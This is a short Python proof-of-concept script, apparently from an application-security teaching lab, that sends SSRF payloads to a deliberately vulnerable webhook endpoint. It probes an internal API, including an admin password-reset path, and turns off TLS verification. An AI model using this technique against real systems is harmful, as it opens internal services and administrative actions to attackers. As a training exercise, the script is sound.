import cli
import requests

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:12300"

if use_vulnerable_endpoint:
    url = f"{url_prefix}/vulnerabilities/ssrf1/submit_webhook/"
else:
    url = f"{url_prefix}/patches/ssrf1/submit_webhook/"

# This configures the proxy web address if you are using one. Exploit will work regardless of whether you have a proxy enabled or not.
# This also sets verification of the server TLS certificate to false because the endpoint is just for demonstration purposes. Ignore any warnings associated with not verifying the certificate.
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
requests.packages.urllib3.disable_warnings()

for custom_url in [
    "http://internal_api",
    "http://internal_api:12301",
    "http://internal_api:12301/reset_admin_password/",
]:
    data = {"custom_url": custom_url}
    r = requests.post(url, data=data, verify=verify, proxies=proxies)
    print(f"Response for {custom_url}: {r.text}\n\n\n")
